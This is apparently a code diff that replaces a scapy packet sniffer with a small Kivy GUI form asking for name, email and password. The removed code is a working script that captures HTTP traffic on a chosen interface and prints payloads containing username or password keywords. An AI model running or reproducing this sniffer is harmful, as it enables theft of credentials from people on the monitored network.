@@ -1,38 +1,36 @@
-#!/usr/bin/env python
-import scapy.all as scapy
-import argparse
-from scapy.layers import http
+from kivy.app import App
+from kivy.uix.label import Label
+from kivy.uix.gridlayout import GridLayout
+from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
 
 
-def get_interface():
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "-i",
-        "--interface",
-        dest="interface",
-        help="Specify interface on which to sniff packets",
-    )
-    arguments = parser.parse_args()
-    return arguments.interface
+class WireGrid(GridLayout):
+    def __init__(self, **kwargs):
+        super(WireGrid, self).__init__(**kwargs)
+
+        self.inside = GridLayout(cols=2)
+
+        self.cols = 1
+        # self.rows = 2
+        self.inside.add_widget(Label(text="Name: "))
+        self.name = TextInput(multiline=False)
+        self.inside.add_widget(self.name)
+        self.inside.add_widget(Label(text="Email: "))
+        self.email = TextInput(multiline=False)
+        self.inside.add_widget(self.email)
+        self.inside.add_widget(Label(text="Password: "))
+        self.password = TextInput(multiline=False)
+        self.inside.add_widget(self.password)
+        self.submit = Button(text="Click me!")
+        self.add_widget(self.inside)
+        self.add_widget(self.submit)
 
 
-def sniff(iface):
-    scapy.sniff(iface=iface, store=False, prn=process_packet)
+class WireSnake(App):
+    def build(self):
+        return WireGrid()
 
 
-def process_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        print(
-            f"[+] Http Request >> {packet[http.HTTPRequest]} {packet[http.HTTPRequest].Path}"
-        )
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keys = ["username", "password", "pass", "email"]
-            for key in keys:
-                if key.encode() in load:
-                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
-                    break
-
-
-iface = get_interface()
-sniff(iface)
+if __name__ == "__main__":
+    WireSnake().run()
